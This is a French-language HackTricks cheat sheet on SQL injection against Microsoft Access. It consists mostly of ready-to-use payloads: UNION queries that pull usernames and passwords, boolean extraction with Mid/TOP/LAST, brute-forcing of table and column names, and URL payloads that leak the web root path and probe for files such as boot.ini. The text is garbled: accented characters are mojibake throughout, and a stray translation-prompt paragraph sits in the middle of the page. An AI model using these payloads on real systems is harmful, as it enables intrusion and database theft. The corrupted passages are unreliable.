# Injection SQL MS Access

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Terrain de jeu en ligne

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## Limitations de la base de donn√©es

### Concat√©nation de cha√Ænes

La concat√©nation de cha√Ænes est possible avec les caract√®res `& (%26)` et `+ (%2b)`.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### Commentaires

Il n'y a pas de commentaires dans MS Access, mais apparemment il est possible de supprimer le dernier caract√®re d'une requ√™te avec un caract√®re NULL :
```sql
1' union select 1,2 from table%00
```
Si cela ne fonctionne pas, vous pouvez toujours corriger la syntaxe de la requ√™te :
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Requ√™tes imbriqu√©es

Elles ne sont pas prises en charge.

### LIMIT

L'op√©rateur **`LIMIT`** n'est **pas impl√©ment√©**. Cependant, il est possible de limiter les r√©sultats de la requ√™te SELECT aux **premi√®res N lignes de la table en utilisant l'op√©rateur `TOP`**. `TOP` accepte en argument un entier, repr√©sentant le nombre de lignes √† renvoyer.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
Tout comme TOP, vous pouvez utiliser **`LAST`** qui obtiendra les ** lignes depuis la fin **.

## Requ√™tes UNION/Sous-requ√™tes

Dans une injection SQL, vous voudrez g√©n√©ralement ex√©cuter une nouvelle requ√™te pour extraire des informations d'autres tables. MS Access exige toujours que dans les **sous-requ√™tes ou requ√™tes suppl√©mentaires, un `FROM` soit indiqu√©**.\
Ainsi, si vous souhaitez ex√©cuter un `UNION SELECT` ou `UNION ALL SELECT` ou un `SELECT` entre parenth√®ses dans une condition, vous devez toujours **indiquer un `FROM` avec un nom de table valide**.\
Par cons√©quent, vous devez conna√Ætre un **nom de table valide**.
```sql
-1' UNION SELECT username,password from users%00
```
### Chainer equals + Substring

{% hint style="warning" %}
Cela vous permettra d'exfiltrer les valeurs de la table actuelle sans avoir besoin de conna√Ætre le nom de la table.
{% endhint %}

**MS Access** permet une **syntaxe √©trange** telle que **`'1'=2='3'='asd'=false`**. Comme l'injection SQL se trouvera g√©n√©ralement dans une clause **`WHERE`**, nous pouvons en abuser.

Imaginez que vous avez une injection SQL dans une base de donn√©es MS Access et que vous connaissez (ou avez devin√©) qu'un **nom de colonne est username**, et que c'est le champ que vous souhaitez **exfiltrer**. Vous pourriez v√©rifier les diff√©rentes r√©ponses de l'application web lorsque la technique de cha√Ænage d'√©galit√©s est utilis√©e et potentiellement exfiltrer du contenu avec une **injection bool√©enne** en utilisant la fonction **`Mid`** pour obtenir des sous-cha√Ænes.
```sql
'=(Mid(username,1,3)='adm')='
```
Si vous connaissez le **nom de la table** et de la **colonne** √† extraire, vous pouvez utiliser une combinaison de `Mid`, `LAST` et `TOP` pour **exposer toutes les informations** via une injection SQL bool√©enne :
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Feel free to check this in the online playground._

### Forcer les noms de tables

En utilisant la technique de cha√Ænage des √©galit√©s, vous pouvez √©galement **forcer les noms de tables** avec quelque chose comme :
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
Le contenu suivant est extrait d'un livre sur les techniques de piratage. Le contenu suivant est issu du fichier pentesting-web/sql-injection/ms-access-sql-injection.md. Traduisez le texte anglais pertinent en fran√ßais et renvoyez la traduction en conservant exactement la m√™me syntaxe markdown et html. Ne traduisez pas les codes, les noms de techniques de piratage, les mots de piratage, les noms de plateformes cloud/SaaS (comme Workspace, aws, gcp...), le mot 'leak', pentesting et les balises markdown. N'ajoutez rien d'autre en dehors de la traduction et de la syntaxe markdown.
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Feel free to check this in the online playground._

* Sqlmap common table names: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* There is another list in [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### Forcer les noms de colonnes par brute force

Vous pouvez **forcer les noms de colonnes actuelles** avec le truc de cha√Ænage √©gal avec :
```sql
'=column_name='
```
Ou avec un **group by** :
```sql
-1' GROUP BY column_name%00
```
Ou vous pouvez effectuer une attaque par force brute sur les noms de colonnes d'une **table diff√©rente** avec :
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Extraction de donn√©es

Nous avons d√©j√† discut√© de la [**technique de cha√Ænage des √©galit√©s**](ms-access-sql-injection.md#chaining-equals-+-substring) **pour extraire des donn√©es des tables actuelles et d'autres tables**. Mais il existe d'autres moyens :
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
En r√©sum√©, la requ√™te utilise une instruction "si-alors" pour d√©clencher un "200 OK" en cas de succ√®s ou une "500 Internal Error" sinon. En exploitant l'op√©rateur TOP 10, il est possible de s√©lectionner les dix premiers r√©sultats. L'utilisation ult√©rieure de LAST permet de consid√©rer uniquement le 10e tuple. Sur cette valeur, en utilisant l'op√©rateur MID, il est possible d'effectuer une simple comparaison de caract√®res. En modifiant correctement l'index de MID et TOP, nous pouvons extraire le contenu du champ "username" pour toutes les lignes.

### Bas√© sur le temps

Consultez [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### Autres fonctions int√©ressantes

* `Mid('admin',1,1)` obtenir une sous-cha√Æne √† partir de la position 1 d'une longueur de 1 (la position initiale est 1)
* `LEN('1234')` obtenir la longueur de la cha√Æne
* `ASC('A')` obtenir la valeur ASCII du caract√®re
* `CHR(65)` obtenir la cha√Æne √† partir de la valeur ASCII
* `IIF(1=1,'a','b')` si alors
* `COUNT(*)` Compter le nombre d'√©l√©ments

## √ânum√©ration des tables

√Ä partir de [**ici**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database), vous pouvez voir une requ√™te pour obtenir les noms des tables :
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
Cependant, notez qu'il est tr√®s courant de trouver des injections SQL o√π **vous n'avez pas acc√®s pour lire la table `MSysObjects`**.

## Acc√®s au syst√®me de fichiers

### Chemin complet du r√©pertoire racine du site Web

La connaissance du **chemin absolu du r√©pertoire racine du site Web peut faciliter d'autres attaques**. Si les erreurs de l'application ne sont pas compl√®tement dissimul√©es, le chemin du r√©pertoire peut √™tre d√©couvert en essayant de s√©lectionner des donn√©es √† partir d'une base de donn√©es inexistante.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access r√©pond avec un **message d'erreur contenant le chemin complet du r√©pertoire du site Web**.

### √ânum√©ration de fichiers

Le vecteur d'attaque suivant peut √™tre utilis√© pour **inf√©rer l'existence d'un fichier sur le syst√®me de fichiers distant**. Si le fichier sp√©cifi√© existe, MS Access d√©clenche un message d'erreur informant que le format de la base de donn√©es est invalide :

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

Une autre fa√ßon d'√©num√©rer les fichiers consiste √† **sp√©cifier un √©l√©ment de base de donn√©es.table**. **Si** le **fichier sp√©cifi√© existe**, MS Access affiche un **message d'erreur de format de base de donn√©es**.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### Deviner le nom du fichier .mdb

Le **nom du fichier de la base de donn√©es (.mdb)** peut √™tre d√©duit avec la requ√™te suivante :

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

O√π **name\[i] est un nom de fichier .mdb** et **realTable est une table existante** dans la base de donn√©es. Bien que MS Access d√©clenche toujours un message d'erreur, il est possible de distinguer entre un nom de fichier invalide et un nom de fichier .mdb valide.

### Cracker de mot de passe .mdb

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) est un utilitaire gratuit qui peut √™tre utilis√© pour r√©cup√©rer le mot de passe principal de la base de donn√©es Microsoft Access 95/97/2000/XP ou Jet Database Engine 3.0/4.0.

## R√©f√©rences

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
